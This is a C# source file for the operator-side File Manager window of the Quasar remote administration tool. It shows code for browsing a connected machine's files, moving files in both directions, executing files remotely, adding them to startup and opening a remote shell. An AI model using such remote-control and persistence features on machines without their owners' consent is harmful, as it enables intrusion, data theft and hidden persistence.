using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using xServer.Controls;
using xServer.Core.Commands;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Models;

namespace xServer.Forms
{
    public partial class FrmFileManager : Form
    {
        /// <summary>
        /// The current remote directory shown in the file manager.
        /// </summary>
        private string _currentDir;

        /// <summary>
        /// The client which can be used for the file manager.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        private enum TransferColumn
        {
            Id,
            Type,
            Status,
        }

        /// <summary>
        /// Holds the opened file manager form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmFileManager> OpenedForms = new Dictionary<Client, FrmFileManager>();

        /// <summary>
        /// Creates a new file manager form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the file manager form.</param>
        /// <returns>
        /// Returns a new file manager form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmFileManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmFileManager f = new FrmFileManager(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmFileManager"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote desktop form.</param>
        public FrmFileManager(Client client)
        {
            _connectClient = client;

            _fileManagerHandler = new FileManagerHandler(client);

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Registers the file manager message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _fileManagerHandler.ProgressChanged += SetStatusMessage;
            _fileManagerHandler.DrivesChanged += DrivesChanged;
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <summary>
        /// Unregisters the file manager message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_fileManagerHandler);
            _fileManagerHandler.ProgressChanged -= SetStatusMessage;
            _fileManagerHandler.DrivesChanged -= DrivesChanged;
            _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void DrivesChanged(object sender, Drive[] drives)
        {
            cmbDrives.Items.Clear();
            cmbDrives.DisplayMember = "DisplayName";
            cmbDrives.ValueMember = "RootDirectory";
            cmbDrives.DataSource = new BindingSource(drives, null);

            SetStatusMessage(this, "Ready");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            txtPath.Text = remotePath;
            _currentDir = remotePath;

            lstDirectory.Items.Clear();

            AddItemToFileBrowser("..", "", FileType.Back, 0);
            foreach (var item in items)
            {
                switch (item.EntryType)
                {
                    case FileType.Directory:
                        AddItemToFileBrowser(item.Name, "", item.EntryType, 1);
                        break;
                    case FileType.File:
                        int imageIndex = item.ContentType == null ? 2 : (int)item.ContentType;
                        AddItemToFileBrowser(item.Name, FileHelper.GetDataSize(item.Size), item.EntryType,
                            imageIndex);
                        break;
                }
            }

            SetStatusMessage(this, "Ready");
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                if (lstTransfers.Items[i].SubItems[(int)TransferColumn.Id].Text == transfer.Id.ToString())
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = transfer.Status;

                    switch (transfer.Status)
                    {
                        case "Completed":
                            lstTransfers.Items[i].ImageIndex = 1;
                            break;
                        case "Canceled":
                            lstTransfers.Items[i].ImageIndex = 0;
                            break;
                    }
                    return;
                }
            }

            var lvi = new ListViewItem(new[]
            {
                transfer.Id.ToString(), transfer.Type.ToString(), transfer.Status, transfer.RemotePath
            }) {Tag = transfer};

            lstTransfers.Items.Add(lvi);
        }

        private string GetAbsolutePath(string item)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, item);
                else
                    return Path.Combine(_currentDir + '/', item);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private string NavigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                return _currentDir;
            }
            else
                return GetAbsolutePath(@"..\");
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);

            _fileManagerHandler.RequestDrives();
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _fileManagerHandler.Dispose();
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            SwitchDirectory(cmbDrives.SelectedValue.ToString());
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (lstDirectory.SelectedItems.Count > 0)
            {
                FileType type = (FileType) lstDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case FileType.Back:
                        SwitchDirectory(NavigateUp());
                        break;
                    case FileType.Directory:
                        SwitchDirectory(GetAbsolutePath(lstDirectory.SelectedItems[0].SubItems[0].Text));
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                FileType type = (FileType)files.Tag;

                if (type == FileType.File)
                {
                    string remotePath = GetAbsolutePath(files.SubItems[0].Text);

                    _fileManagerHandler.BeginDownloadFile(remotePath);

                    //AddTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
                }
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Select files to upload";
                ofd.Filter = "All files (*.*)|*.*";
                ofd.Multiselect = true;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    foreach (var localFilePath in ofd.FileNames)
                    {
                        if (!File.Exists(localFilePath)) continue;

                        string remotePath = GetAbsolutePath(Path.GetFileName(localFilePath));

                        _fileManagerHandler.BeginUploadFile(localFilePath, remotePath);
                    }
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                FileType type = (FileType) files.Tag;

                if (type == FileType.File)
                {
                    string remotePath = GetAbsolutePath(files.SubItems[0].Text);

                    _fileManagerHandler.StartProcess(remotePath);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                FileType type = (FileType)files.Tag;

                switch (type)
                {
                    case FileType.Directory:
                    case FileType.File:
                        string path = GetAbsolutePath(files.SubItems[0].Text);
                        string newName = files.SubItems[0].Text;

                        if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                        {
                            newName = GetAbsolutePath(newName);
                            _fileManagerHandler.RenameFile(path, newName, type);
                        }
                        break;
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = lstDirectory.SelectedItems.Count;
            if (count == 0) return;
            if (MessageBox.Show(string.Format("Are you sure you want to delete {0} file(s)?", count),
                "Delete Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (ListViewItem files in lstDirectory.SelectedItems)
                {
                    FileType type = (FileType)files.Tag;

                    switch (type)
                    {
                        case FileType.Directory:
                        case FileType.File:
                            string path = GetAbsolutePath(files.SubItems[0].Text);
                            _fileManagerHandler.DeleteFile(path, type);
                            break;
                    }
                }
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                FileType type = (FileType)files.Tag;

                if (type == FileType.File)
                {
                    string path = GetAbsolutePath(files.SubItems[0].Text);

                    using (var frm = new FrmAddToAutostart(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            _fileManagerHandler.AddToStartup(frm.StartupItem);
                        }
                    }
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = _currentDir;
            if (lstDirectory.SelectedItems.Count == 1)
            {
                var item = lstDirectory.SelectedItems[0];
                FileType type = (FileType)item.Tag;

                if (type == FileType.Directory)
                {
                    path = GetAbsolutePath(item.SubItems[0].Text);
                }
            }

            if (_connectClient.Value.FrmRs != null)
            {
                _connectClient.Send(new DoShellExecute {Command = $"cd \"{path}\""});
                _connectClient.Value.FrmRs.Focus();
            }
            else
            {
                FrmRemoteShell frmRS = new FrmRemoteShell(_connectClient);
                frmRS.Show();
                _connectClient.Send(new DoShellExecute {Command = $"cd \"{path}\""});
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);
            
            Process.Start(_connectClient.Value.DownloadDirectory);
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Pending")) continue;

                int id = int.Parse(transfer.SubItems[(int)TransferColumn.Id].Text);

                _fileManagerHandler.CancelFileTransfer(id);
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.Items)
            {
                if (transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Downloading") ||
                    transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Uploading") ||
                    transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Pending")) continue;
                transfer.Remove();
            }
        }

        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) // allow drag & drop with files
                e.Effect = DragDropEffects.Copy;
        }

        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                foreach (string localFilePath in files)
                {
                    if (!File.Exists(localFilePath)) continue;

                    string remotePath = GetAbsolutePath(Path.GetFileName(localFilePath));

                    _fileManagerHandler.BeginUploadFile(localFilePath, remotePath);
                }
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
        {
            // refresh when F5 is pressed
            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
            {
                RefreshDirectory();
                e.Handled = true;
            }
        }

        private void AddItemToFileBrowser(string name, string size, FileType type, int imageIndex)
        {
            ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != FileType.Back) ? type.ToString() : string.Empty })
            {
                Tag = type,
                ImageIndex = imageIndex
            };

            lstDirectory.Items.Add(lvi);
        }

        /// <summary>
        /// Sets the status of the file manager.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="message">The new status.</param>
        private void SetStatusMessage(object sender, string message)
        {
            stripLblStatus.Text = $"Status: {message}";
        }

        private void RefreshDirectory()
        {
            SwitchDirectory(_currentDir);
        }

        private void SwitchDirectory(string remotePath)
        {
            _fileManagerHandler.RequestDirectoryContents(remotePath);
            SetStatusMessage(this, "Loading directory content...");
        }
    }
}